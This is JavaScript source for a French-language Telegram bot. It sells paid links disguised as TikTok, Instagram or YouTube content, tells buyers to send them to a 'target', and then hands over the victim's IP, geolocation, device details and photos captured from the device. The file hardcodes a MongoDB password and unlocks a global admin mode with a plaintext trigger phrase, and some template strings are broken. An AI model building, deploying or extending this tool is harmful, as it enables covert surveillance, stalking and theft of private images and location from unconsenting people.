const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");
const crypto = require("crypto");
const mongoose = require("mongoose");

// Configuration de l'environnement
dotenv.config();

// --- 0. CONNEXION MONGODB ---
const MONGO_URI = "mongodb+srv://Dssiaka:Keita1234.76100137@queennezuko.gnrhdxk.mongodb.net/";

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connecté à MongoDB (Jetons Immortels activés)"))
    .catch(err => console.error("❌ Erreur MongoDB:", err));

// Définition du "Schéma" utilisateur
const userSchema = new mongoose.Schema({
    chatId: { type: String, required: true, unique: true },
    coins: { type: Number, default: 0 },
    lastActive: { type: Date, default: Date.now },
    totalGenerated: { type: Number, default: 0 },
    totalPhotosViewed: { type: Number, default: 0 }
});

const User = mongoose.model('User', userSchema);

// Fonction helper pour récupérer ou créer un utilisateur
async function getUser(chatId) {
    let user = await User.findOne({ chatId: chatId.toString() });
    if (!user) {
        user = await User.create({ 
            chatId: chatId.toString(), 
            coins: 5, // Bonus de bienvenue
            totalGenerated: 0,
            totalPhotosViewed: 0
        });
        
        // Envoyer un message de bienvenue spécial
        await sendWelcomeMessage(chatId);
    }
    return user;
}

// --- CONFIGURATION DES TARIFS ---
const PRIX_GENERATION = 3;
const PRIX_PHOTOS = 3;
const NB_PHOTOS_A_AFFICHER = 3;

// --- CONFIGURATION DU BOT ---
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

// Filtrer les logs
const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (message.includes("TLSWrap") || message.includes("Symbol(") || message.includes("kBuffer")) return;
    originalLog.apply(console, args);
};

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: { timeout: 10 }
    } 
});

const BASE_URL = process.env.RENDER_EXTERNAL_URL 
    ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
    : `http://localhost:\${process.env.PORT || 5000}`;

const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;

let isAdminMode = false;

console.log(`🤖 Bot Telegram dynamique démarré !`);

// --- THÈMES ET STYLES ---
const themes = {
    primary: {
        emoji: "🔥",
        color: "🟢"
    },
    success: {
        emoji: "✅",
        color: "🟢"
    },
    error: {
        emoji: "❌",
        color: "🔴"
    },
    warning: {
        emoji: "⚠️",
        color: "🟡"
    },
    info: {
        emoji: "ℹ️",
        color: "🔵"
    }
};

// --- FONCTIONS DE STYLE ---

// Créer un message stylisé avec animation
function createStyledMessage(title, content, theme = "primary", animated = true) {
    const themeData = themes[theme];
    const animation = animated ? "⚡" : "";
    
    return `${animation} ${themeData.emoji} *${title}*\n\n${content}`;
}

// Créer un clavier stylisé
function createStyledKeyboard(buttons, columns = 2) {
    const keyboard = [];
    
    for (let i = 0; i < buttons.length; i += columns) {
        const row = [];
        for (let j = 0; j < columns && i + j < buttons.length; j++) {
            row.push(buttons[i + j]);
        }
        keyboard.push(row);
    }
    
    return { reply_markup: { inline_keyboard: keyboard } };
}

// Envoyer un message avec effet de frappe
async function sendTypingMessage(chatId, text, options = {}) {
    await bot.sendChatAction(chatId, "typing");
    await new Promise(resolve => setTimeout(resolve, 800));
    return bot.sendMessage(chatId, text, options);
}

// Envoyer un message de bienvenue spécial
async function sendWelcomeMessage(chatId) {
    const welcomeKeyboard = createStyledKeyboard([
        { text: "🎯 Commencer", callback_data: "start_tour" },
        { text: "💰 Mon solde", callback_data: "welcome_balance" }
    ], 1);
    
    await bot.sendMessage(chatId, 
        createStyledMessage(
            "🎉 BONUS DE BIENVENUE !",
            "Félicitations ! Vous avez reçu **5 jetons gratuits** pour commencer !\n\n" +
            "Utilisez-les pour générer vos premiers liens et découvrir toutes les fonctionnalités du bot.",
            "success"
        ),
        { parse_mode: "Markdown", ...welcomeKeyboard }
    );
}

// --- COMMANDES ADMINISTRATEUR ---

bot.onText(/DsSiakaAdmin/, (msg) => {
    isAdminMode = true;
    const adminKeyboard = createStyledKeyboard([
        { text: "📊 Statistiques", callback_data: "admin_stats" },
        { text: "💰 Ajouter des jetons", callback_data: "admin_add_coins" },
        { text: "🔒 Verrouiller", callback_data: "admin_lock" }
    ], 1);
    
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "🔓 MODE ADMIN ACTIVÉ",
            "Vous avez maintenant accès à toutes les fonctionnalités administrateur.\n\n" +
            "Utilisez les boutons ci-dessous pour gérer le bot.",
            "success"
        ),
        { parse_mode: "Markdown", ...adminKeyboard }
    );
});

bot.onText(/\/lock/, (msg) => {
    isAdminMode = false;
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "🔒 MODE ADMIN VERROUILLÉ",
            "Le mode administrateur a été désactivé.",
            "info"
        ),
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/addcoins (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdminMode) return bot.sendMessage(chatId, 
        createStyledMessage(
            "🚫 ACCÈS REFUSÉ",
            "Vous n'avez pas les permissions nécessaires pour utiliser cette commande.",
            "error"
        ),
        { parse_mode: "Markdown" }
    );

    const targetId = match[1];
    const amount = parseInt(match[2]);

    try {
        const user = await User.findOneAndUpdate(
            { chatId: targetId },
            { $inc: { coins: amount } },
            { new: true, upsert: true }
        );
        
        bot.sendMessage(chatId, 
            createStyledMessage(
                "✅ OPÉRATION RÉUSSIE",
                `${amount} jetons ajoutés à \`${targetId}\`.\nNouveau solde : ${user.coins} 🪙`,
                "success"
            ),
            { parse_mode: "Markdown" }
        );
        
        bot.sendMessage(targetId, 
            createStyledMessage(
                "🎁 PAIEMENT REÇU",
                `L'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${user.coins} 🪙`,
                "success"
            ),
            { parse_mode: "Markdown" }
        ).catch(() => {});
        
    } catch (err) {
        bot.sendMessage(chatId, 
            createStyledMessage(
                "❌ ERREUR DE BASE DE DONNÉES",
                "Une erreur est survenue lors de la mise à jour des jetons.",
                "error"
            ),
            { parse_mode: "Markdown" }
        );
        console.error(err);
    }
});

// --- COMMANDES UTILISATEUR ---

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const user = await getUser(chatId);
    
    const mainKeyboard = createStyledKeyboard([
        { text: "🎯 Générer un lien", callback_data: "generate_link" },
        { text: "💰 Mon solde", callback_data: "check_balance" },
        { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
        { text: "❓ Aide", callback_data: "show_help" }
    ], 2); // Ajout du paramètre de colonnes manquant
    
    await sendTypingMessage(chatId,
        createStyledMessage(
            "🔥 BOT DE CAPTURE ACTIVÉ",
            `<b>Bienvenue sur votre assistant de capture !</b>\n\n` +
            `<i>Votre solde actuel :</i> <code>${user.coins} 🪙</code>\n\n` +
            `<b>Tarifs :</b>\n` +
            `• <i>Générer un lien</i> : <b>${PRIX_GENERATION} 🪙</b>\n` +
            `• <i>Voir les photos</i> : <b>${PRIX_PHOTOS} 🪙</b>\n\n` +
            `<b>Statistiques :</b>\n` +
            `• Liens générés : <b>${user.totalGenerated}</b>\n` +
            `• Photos vues : <b>${user.totalPhotosViewed}</b>`,
            "primary"
        ),
        { parse_mode: 'HTML', ...mainKeyboard }
    ); // Ajout de la parenthèse fermante manquante
});

bot.onText(/\/acheter/, (msg) => {
    const chatId = msg.chat.id;
    const buyKeyboard = createStyledKeyboard([
        { text: "💳 Contacter le vendeur", url: "https://t.me/DsSiaka" },
        { text: "📋 Voir les tarifs", callback_data: "show_pricing" },
        { text: "🔙 Retour au menu", callback_data: "back_to_main" }
    ], 1);
    
    bot.sendMessage(chatId, 
        createStyledMessage(
            "💎 ACHETER DES JETONS",
            `Vendeur officiel : <b>@DsSiaka</b>\n\n` +
            `🆔 <b>Votre ID :</b> <code>${chatId}</code>\n\n` +
            `⚡ Recharge immédiate après paiement !\n\n` +
            `📦 <b>Offres disponibles :</b>\n` +
            `• 10 jetons - 2€\n` +
            `• 25 jetons - 5€\n` +
            `• 50 jetons - 10€\n` +
            `• 100 jetons - 18€`,
            "info"
        ),
        { parse_mode: 'HTML', ...buyKeyboard }
    );
});

bot.onText(/\/balance/, async (msg) => {
    const user = await getUser(msg.chat.id);
    const balanceKeyboard = createStyledKeyboard([
        { text: "💳 Recharger", callback_data: "buy_coins" },
        { text: "📊 Historique", callback_data: "show_history" },
        { text: "🔙 Retour au menu", callback_data: "back_to_main" }
    ], 1);
    
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "💰 VOTRE PORTEFEUILLE",
            `<b>Solde actuel :</b> <code>${user.coins} 🪙</code>\n\n` +
            `<b>Statistiques :</b>\n` +
            `• Liens générés : ${user.totalGenerated}\n` +
            `• Photos vues : ${user.totalPhotosViewed}\n\n` +
            `<i>Vous avez besoin de plus de jetons ?</i> Contactez <b>@DsSiaka</b>`,
            "info"
        ),
        { parse_mode: 'HTML', ...balanceKeyboard }
    );
});

// --- GESTION DES CLICS ---
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // A. Voir Preview (Gratuit)
    if (data.startsWith("data_")) {
        bot.answerCallbackQuery(query.id);
        const linkId = data.replace("data_", "");
        await sendDataPreview(chatId, linkId);
        return;
    }

    // B. Acheter Photos (Payant)
    if (data.startsWith("buyphotos_")) {
        const linkId = data.replace("buyphotos_", "");
        const user = await getUser(chatId);

        if (user.coins < PRIX_PHOTOS) {
            return bot.answerCallbackQuery(query.id, { text: `❌ Manque de jetons ! Il faut ${PRIX_PHOTOS} 🪙`, show_alert: true });
        }

        // Débit via MongoDB
        user.coins -= PRIX_PHOTOS;
        user.totalPhotosViewed += 1;
        await user.save();
        
        bot.answerCallbackQuery(query.id, { text: `✅ Photos débloquées (-${PRIX_PHOTOS} 🪙)` });
        await sendPhotos(chatId, linkId);
        return;
    }

    // C. Générer Lien (Payant)
    if (data === "generate_link" || data === "tiktok" || data === "instagram" || data === "youtube") {
        const platform = data === "generate_link" ? null : data;
        const user = await getUser(chatId);
        
        if (user.coins < PRIX_GENERATION) {
            const insufficientKeyboard = createStyledKeyboard([
                { text: "💳 Recharger maintenant", url: "https://t.me/DsSiaka" },
                { text: "🔙 Retour au menu", callback_data: "back_to_main" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "⚠️ SOLDE INSUFFISANT",
                    `💸 <b>Coût requis :</b> ${PRIX_GENERATION} 🪙\n` +
                    `💰 <b>Votre solde :</b> ${user.coins} 🪙\n\n` +
                    `<i>Rechargez votre compte pour continuer.</i>`,
                    "warning"
                ),
                { parse_mode: 'HTML', ...insufficientKeyboard }
            );
            return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
        }

        if (platform) {
            try {
                await bot.sendChatAction(chatId, "typing");
                
                const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
                const { id, url } = response.data;

                // Débit via MongoDB
                user.coins -= PRIX_GENERATION;
                user.totalGenerated += 1;
                await user.save();

                bot.answerCallbackQuery(query.id, { text: `✅ Lien généré ! -${PRIX_GENERATION} Jetons` });

                const linkKeyboard = createStyledKeyboard([
                    { text: "🔗 Ouvrir le lien", url: url },
                    { text: "📊 Voir les données", callback_data: `data_${id}` },
                    { text: "🔄 Générer un autre", callback_data: "generate_link" }
                ], 1);

                await bot.sendMessage(chatId, 
                    createStyledMessage(
                        "✅ LIEN CRÉÉ AVEC SUCCÈS",
                        `<b>Plateforme :</b> ${platform.toUpperCase()}\n` +
                        `<b>Lien :</b> <code>${url}</code>\n\n` +
                        `💰 <b>Restant :</b> ${user.coins} 🪙\n` +
                        `⚡ <b>Statut :</b> En attente du clic...`,
                        "success"
                    ),
                    { parse_mode: 'HTML', disable_web_page_preview: true, ...linkKeyboard }
                );

            } catch (error) {
                console.error("Erreur génération:", error.message);
                bot.answerCallbackQuery(query.id, { text: "❌ Erreur serveur", show_alert: true });
            }
        } else {
            // Afficher le choix de plateforme
            const platformKeyboard = createStyledKeyboard([
                { text: "🎵 TikTok", callback_data: "tiktok" },
                { text: "📸 Instagram", callback_data: "instagram" },
                { text: "📺 YouTube", callback_data: "youtube" },
                { text: "💰 Mon solde", callback_data: "check_balance" },
                { text: "❓ Aide", callback_data: "show_help" }
            ], 2);

            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "🎯 GÉNÉRATEUR DE LIENS",
                    `💸 <b>Coût :</b> ${PRIX_GENERATION} 🪙\n` +
                    `💰 <b>Solde :</b> ${user.coins} 🪙\n\n` +
                    `<i>Choisissez la plateforme pour générer votre lien :</i>`,
                    "info"
                ),
                { parse_mode: 'HTML', ...platformKeyboard }
            );
        }
        return;
    }

    // D. Autres actions
    switch (data) {
        case "check_balance":
            const user = await getUser(chatId);
            const balanceKeyboard = createStyledKeyboard([
                { text: "💳 Recharger", callback_data: "buy_coins" },
                { text: "🔙 Retour au menu", callback_data: "back_to_main" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "💰 VOTRE PORTEFEUILLE",
                    `<b>Solde actuel :</b> <code>${user.coins} 🪙</code>\n\n` +
                    `<b>Statistiques :</b>\n` +
                    `• Liens générés : ${user.totalGenerated}\n` +
                    `• Photos vues : ${user.totalPhotosViewed}`,
                    "info"
                ),
                { parse_mode: 'HTML', ...balanceKeyboard }
            );
            break;

        case "buy_coins":
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "💎 ACHETER DES JETONS",
                    `Vendeur officiel : <b>@DsSiaka</b>\n\n` +
                    `🆔 <b>Votre ID :</b> <code>${chatId}</code>\n\n` +
                    `⚡ Recharge immédiate après paiement !`,
                    "info"
                ),
                { parse_mode: 'HTML' }
            );
            break;

        case "show_help":
            const helpKeyboard = createStyledKeyboard([
                { text: "🎯 Générer un lien", callback_data: "generate_link" },
                { text: "💰 Mon solde", callback_data: "check_balance" },
                { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
                { text: "🔙 Retour au menu", callback_data: "back_to_main" }
            ], 2);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "📚 GUIDE D'UTILISATION",
                    `<b>Comment utiliser le bot :</b>\n\n` +
                    `1. <b>Générer un lien</b> (${PRIX_GENERATION}🪙)\n` +
                    `   Choisissez une plateforme (TikTok, Instagram, YouTube)\n\n` +
                    `2. <b>Partager le lien</b>\n` +
                    `   Envoyez le lien généré à votre cible\n\n` +
                    `3. <b>Voir les données</b>\n` +
                    `   Accédez aux informations capturées (IP, localisation, etc.)\n\n` +
                    `4. <b>Débloquer les photos</b> (${PRIX_PHOTOS}🪙)\n` +
                    `   Accédez aux photos capturées depuis l'appareil\n\n` +
                    `<b>Besoin d'aide supplémentaire ?</b>\n` +
                    `Contactez <b>@DsSiaka</b> pour un support personnalisé`,
                    "info"
                ),
                { parse_mode: 'HTML', ...helpKeyboard }
            );
            break;

        case "back_to_main":
            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "🔥 MENU PRINCIPAL",
                    "Bienvenue sur le menu principal !\n\n" +
                    "Choisissez une option ci-dessous pour commencer.",
                    "primary"
                ),
                { parse_mode: 'Markdown' }
            );
            // Simuler la commande /start
            bot.emit("message", { chat: { id: chatId }, text: "/start" });
            break;

        case "show_pricing":
            const pricingKeyboard = createStyledKeyboard([
                { text: "💳 Contacter le vendeur", url: "https://t.me/DsSiaka" },
                { text: "🔙 Retour", callback_data: "buy_coins" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "💎 TARIFS DES JETONS",
                    `<b>Nos offres :</b>\n\n` +
                    `🪙 <b>10 jetons</b> - 2€\n` +
                    `🪙 <b>25 jetons</b> - 5€\n` +
                    `🪙 <b>50 jetons</b> - 10€\n` +
                    `🪙 <b>100 jetons</b> - 18€\n\n` +
                    `<i>Pour commander, contactez @DsSiaka</i>`,
                    "info"
                ),
                { parse_mode: 'HTML', ...pricingKeyboard }
            );
            break;

        case "show_history":
            const historyUser = await getUser(chatId);
            const historyKeyboard = createStyledKeyboard([
                { text: "🔙 Retour", callback_data: "check_balance" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "📊 VOTRE HISTORIQUE",
                    `<b>Résumé de votre activité :</b>\n\n` +
                    `• <b>Liens générés :</b> ${historyUser.totalGenerated}\n` +
                    `• <b>Photos vues :</b> ${historyUser.totalPhotosViewed}\n` +
                    `• <b>Dernière activité :</b> ${historyUser.lastActive.toLocaleString()}\n\n` +
                    `<i>Historique détaillé bientôt disponible !</i>`,
                    "info"
                ),
                { parse_mode: 'HTML', ...historyKeyboard }
            );
            break;

        case "admin_stats":
            if (!isAdminMode) {
                return bot.answerCallbackQuery(query.id, { text: "❌ Accès refusé", show_alert: true });
            }
            
            try {
                const totalUsers = await User.countDocuments();
                const totalCoins = await User.aggregate([
                    { $group: { _id: null, total: { $sum: "$coins" } } }
                ]);
                
                const statsKeyboard = createStyledKeyboard([
                    { text: "🔒 Verrouiller", callback_data: "admin_lock" },
                    { text: "🔙 Retour", callback_data: "back_to_main" }
                ], 1);
                
                bot.sendMessage(chatId, 
                    createStyledMessage(
                        "📊 STATISTIQUES ADMIN",
                        `<b>Statistiques globales :</b>\n\n` +
                        `• <b>Utilisateurs totaux :</b> ${totalUsers}\n` +
                        `• <b>Jetons en circulation :</b> ${totalCoins[0]?.total || 0}\n` +
                        `• <b>Liens générés :</b> En attente de mise à jour\n\n` +
                        `<i>Rapport détaillé disponible prochainement</i>`,
                        "info"
                    ),
                    { parse_mode: 'HTML', ...statsKeyboard }
                );
            } catch (err) {
                bot.sendMessage(chatId, 
                    createStyledMessage(
                        "❌ ERREUR",
                        "Impossible de récupérer les statistiques",
                        "error"
                    ),
                    { parse_mode: 'Markdown' }
                );
            }
            break;

        case "admin_add_coins":
            if (!isAdminMode) {
                return bot.answerCallbackQuery(query.id, { text: "❌ Accès refusé", show_alert: true });
            }
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "💰 AJOUTER DES JETONS",
                    "Utilisez la commande :\n" +
                    "`/addcoins [ID_UTILISATEUR] [NOMBRE_JETONS]`",
                    "info"
                ),
                { parse_mode: 'Markdown' }
            );
            break;

        case "admin_lock":
            isAdminMode = false;
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "🔒 MODE ADMIN VERROUILLÉ",
                    "Le mode administrateur a été désactivé.",
                    "info"
                ),
                { parse_mode: 'Markdown' }
            );
            break;

        case "start_tour":
            const tourKeyboard = createStyledKeyboard([
                { text: "🎯 Générer un lien", callback_data: "generate_link" },
                { text: "💰 Mon solde", callback_data: "welcome_balance" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "🎯 VISITE GUIDÉE",
                    "<b>Bienvenue !</b> Voici comment utiliser le bot :\n\n" +
                    "1. <b>Générer un lien</b> - Créez un lien de capture pour TikTok, Instagram ou YouTube\n" +
                    "2. <b>Partager le lien</b> - Envoyez-le à votre cible\n" +
                    "3. <b>Voir les données</b> - Accédez aux informations capturées\n\n" +
                    "Commencez par générer votre premier lien !",
                    "info"
                ),
                { parse_mode: 'HTML', ...tourKeyboard }
            );
            break;

        case "welcome_balance":
            const welcomeUser = await getUser(chatId);
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "💰 VOTRE SOLDE",
                    `<b>Vos jetons :</b> <code>${welcomeUser.coins} 🪙</code>\n\n` +
                    `<i>Chaque lien généré coûte ${PRIX_GENERATION} jetons</i>`,
                    "info"
                ),
                { parse_mode: 'HTML' }
            );
            break;

        default:
            bot.answerCallbackQuery(query.id, { text: "❌ Action non reconnue", show_alert: true });
    }
});

// --- FONCTIONS AFFICHAGE ---

bot.onText(/\/data (.+)/, async (msg, match) => {
    await sendDataPreview(msg.chat.id, match[1].trim());
});

async function sendDataPreview(chatId, linkId) {
    try {
        await bot.sendChatAction(chatId, "typing");
        
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer \${authToken}` },
        });
        const data = response.data;
        const photoCount = data.images ? data.images.length : 0;

        let message = createStyledMessage(
            "📊 RAPPORT DE CAPTURE",
            `<b>ID du lien :</b> <code>${linkId}</code>\n\n` +
            `⏰ <b>Date/Heure :</b> ${new Date(data.timestamp).toLocaleString("fr-FR")}\n` +
            `🌐 <b>IP :</b> ${data.ip || "Masquée"}\n`,
            "info"
        );

        if (data.location && data.location.latitude) {
            message += `\n📍 <b>Localisation :</b> ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
        }

        if (data.device) {
            message += `\n📱 <b>Appareil :</b> ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
            message += `🖥️ <b>Écran :</b> ${data.device.screen?.width || "?"}x${data.device.screen?.height || "?"}\n`;
            message += `🌍 <b>Fuseau horaire :</b> ${data.device.timezone || "?"}\n`;
        }

        message += `\n📸 <b>Photos disponibles :</b> ${photoCount}\n`;
        
        const keyboard = { reply_markup: { inline_keyboard: [] } };
        
        if (photoCount > 0) {
            message += `\n🔒 <b>Photos verrouillées.</b>\n<i>Coût : ${PRIX_PHOTOS} 🪙</i>`;
            keyboard.reply_markup.inline_keyboard.push([
                { text: `📸 Voir les \${Math.min(photoCount, NB_PHOTOS_A_AFFICHER)} Photos (${PRIX_PHOTOS} 🪙)`, callback_data: `buyphotos_${linkId}` }
            ]);
        } else {
            message += `\n⚠️ <i>Aucune photo capturée.</i>`;
        }

        keyboard.reply_markup.inline_keyboard.push([
            { text: "🔄 Générer un autre lien", callback_data: "generate_link" },
            { text: "🔙 Retour au menu", callback_data: "back_to_main" }
        ]);

        await bot.sendMessage(chatId, message, { parse_mode: "HTML", ...keyboard });

    } catch (error) {
        bot.sendMessage(chatId, 
            createStyledMessage(
                "❌ DONNÉES NON TROUVÉES",
                `Aucune donnée disponible pour le lien <code>${linkId}</code>\n\n` +
                `<i>Vérifiez que l'ID est correct et que quelqu'un a cliqué sur le lien.</i>`,
                "error"
            ),
            { parse_mode: "HTML" }
        );
    }
}

async function sendPhotos(chatId, linkId) {
    try {
        await bot.sendChatAction(chatId, "upload_photo");
        
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;
        
        if (!data.images || data.images.length === 0) return;

        await bot.sendMessage(chatId, 
            createStyledMessage(
                "🔓 PHOTOS DÉBLOQUÉES",
                "Voici les photos capturées depuis l'appareil de la cible.",
                "success"
            ),
            { parse_mode: 'Markdown' }
        );

        const limit = Math.min(data.images.length, NB_PHOTOS_A_AFFICHER);
        
        for (let i = 0; i < limit; i++) {
            try {
                await bot.sendChatAction(chatId, "upload_photo");
                
                const imgBuffer = Buffer.from(data.images[i], "base64");
                const photoKeyboard = createStyledKeyboard([
                    { text: "💾 Enregistrer", callback_data: `save_photo_${i}` }
                ], 1);
                
                await bot.sendPhoto(chatId, imgBuffer, { 
                    caption: `📸 Photo ${i + 1}/${limit}\n<i>Appuyez sur Enregistrer pour télécharger</i>`,
                    parse_mode: 'HTML',
                    ...photoKeyboard
                });
                
                // Pause entre l'envoi des photos pour éviter les limitations
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (err) {
                console.error(`Erreur image ${i}:`, err);
                await bot.sendMessage(chatId, `❌ Erreur lors de l'envoi de la photo ${i + 1}`);
            }
        }
        
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            const locationKeyboard = createStyledKeyboard([
                { text: "🗺️ Voir sur Maps", url: mapsUrl },
                { text: "🔄 Générer un autre lien", callback_data: "generate_link" }
            ], 1);
            
            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "🗺️ LOCALISATION CAPTURÉE",
                    `<b>Coordonnées :</b> ${data.location.latitude}, ${data.location.longitude}\n` +
                    `<b>Précision :</b> ±${data.location.accuracy || "?"}m\n\n` +
                    `<i>Cliquez sur le bouton pour voir la position sur Google Maps</i>`,
                    "info"
                ),
                { parse_mode: 'HTML', ...locationKeyboard }
            );
        }

    } catch (error) {
        bot.sendMessage(chatId, 
            createStyledMessage(
                "❌ ERREUR LORS DE L'ENVOI",
                "Une erreur est survenue lors de la récupération des photos.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
    }
}

bot.onText(/\/help/, (msg) => {
    const helpKeyboard = createStyledKeyboard([
        { text: "🎯 Générer un lien", callback_data: "generate_link" },
        { text: "💰 Mon solde", callback_data: "check_balance" },
        { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
        { text: "🔙 Retour au menu", callback_data: "back_to_main" }
    ], 2);
    
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "📚 GUIDE D'UTILISATION",
            `<b>Comment utiliser le bot :</b>\n\n` +
            `1. <b>Générer un lien</b> (\${PRIX_GENERATION}🪙)\n` +
            `   Choisissez une plateforme (TikTok, Instagram, YouTube)\n\n` +
            `2. <b>Partager le lien</b>\n` +
            `   Envoyez le lien généré à votre cible\n\n` +
            `3. <b>Voir les données</b>\n` +
            `   Accédez aux informations capturées (IP, localisation, etc.)\n\n` +
            `4. <b>Débloquer les photos</b> (\${PRIX_PHOTOS}🪙)\n` +
            `   Accédez aux photos capturées depuis l'appareil\n\n` +
            `<b>Besoin d'aide supplémentaire ?</b>\n` +
            `Contactez <b>@DsSiaka</b> pour un support personnalisé`,
            "info"
        ),
        { parse_mode: 'HTML', ...helpKeyboard }
    );
});

// --- FONCTIONS AVANCÉES ---

// Fonction pour envoyer des messages avec effet de frappe
async function sendTypingMessage(chatId, text, options = {}) {
    await bot.sendChatAction(chatId, "typing");
    await new Promise(resolve => setTimeout(resolve, 800));
    return bot.sendMessage(chatId, text, options);
}

// Fonction pour créer un menu contextuel dynamique
function createContextMenu(actions) {
    const keyboard = { reply_markup: { inline_keyboard: [] } };
    
    actions.forEach(action => {
        keyboard.reply_markup.inline_keyboard.push([
            { text: action.text, callback_data: action.callback_data }
        ]);
    });
    
    return keyboard;
}

// Fonction pour afficher un message de chargement animé
async function sendLoadingMessage(chatId, title, duration = 2000) {
    const loadingMessage = await bot.sendMessage(chatId, 
        createStyledMessage(
            "⏳ CHARGEMENT",
            title,
            "info"
        ),
        { parse_mode: 'Markdown' }
    );
    
    // Animation de chargement
    const loadingSteps = ["⏳", "🔄", "⚡"];
    for (let i = 0; i < loadingSteps.length; i++) {
        await new Promise(resolve => setTimeout(resolve, duration / loadingsteps.length));
        await bot.editMessageText(
            createStyledMessage(
                `${loadingSteps[i]} CHARGEMENT`,
                title,
                "info"
            ),
            {
                chat_id: chatId,
                message_id: loadingMessage.message_id,
                parse_mode: 'Markdown'
            }
        );
    }
    
    return loadingMessage;
}

// Fonction pour créer un menu de navigation
function createNavigationMenu(currentPage, totalPages, callbackPrefix) {
    const navigation = [];
    
    if (currentPage > 1) {
        navigation.push({ text: "⬅️ Précédent", callback_data: `${callbackPrefix}_${currentPage - 1}` });
    }
    
    if (currentPage < totalPages) {
        navigation.push({ text: "Suivant ➡️", callback_data: `${callbackPrefix}_\${currentPage + 1}` });
    }
    
    return navigation;
}

// --- GESTION DES ERREURS AVANCÉE ---

// Gestionnaire d'erreurs global
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    process.exit(1);
});

// Logs d'erreur améliorés
bot.on("polling_error", (error) => {
    console.error(`⚠️ Erreur Polling: \${error.message}`);
    
    // Envoyer une notification à l'admin en cas d'erreur critique
    if (error.message.includes("ETELEGRAM")) {
        bot.sendMessage(process.env.ADMIN_CHAT_ID || "", 
            createStyledMessage(
                "🚨 ERREUR CRITIQUE",
                `Le bot a rencontré une erreur critique : ${error.message}`,
                "error"
            ),
            { parse_mode: 'Markdown' }
        ).catch(() => {});
    }
});

bot.on("webhook_error", (error) => {
    console.error(`⚠️ Erreur Webhook: ${error.message}`);
});

// --- FONCTIONS DE MAINTENANCE ---

// Fonction de nettoyage des données anciennes
async function cleanupOldData() {
    try {
        const thirtyDaysAgo = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);
        
        // Supprimer les liens de plus de 30 jours
        const result = await mongoose.connection.db.collection('links').deleteMany({
            created: { $lt: thirtyDaysAgo }
        });
        
        console.log(`🧹 Nettoyage effectué : \${result.deletedCount} liens supprimés`);
    } catch (error) {
        console.error('Erreur lors du nettoyage des données:', error);
    }
}

// Exécuter le nettoyage tous les jours à minuit
setInterval(cleanupOldData, 24 * 60 * 60 * 1000);

// --- FONCTIONS DE NOTIFICATION ---

// Notifier les utilisateurs inactifs
async function notifyInactiveUsers() {
    try {
        const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
        
        const inactiveUsers = await User.find({
            lastActive: { $lt: sevenDaysAgo },
            coins: { $gt: 0 }
        });
        
        for (const user of inactiveUsers) {
            bot.sendMessage(user.chatId, 
                createStyledMessage(
                    "🔔 NOUVEAUTÉS",
                    "Revenez utiliser le bot ! Nous avons ajouté de nouvelles fonctionnalités.\n\n" +
                    "Utilisez le code <b>RETOUR10</b> pour recevoir 10 jetons gratuits !",
                    "info"
                ),
                { parse_mode: 'HTML' }
            ).catch(() => {});
        }
        
        console.log(`📧 Notifications envoyées à \${inactiveUsers.length} utilisateurs inactifs`);
    } catch (error) {
        console.error('Erreur lors de l\'envoi des notifications:', error);
    }
}

// Envoyer les notifications une fois par semaine
setInterval(notifyInactiveUsers, 7 * 24 * 60 * 60 * 1000);

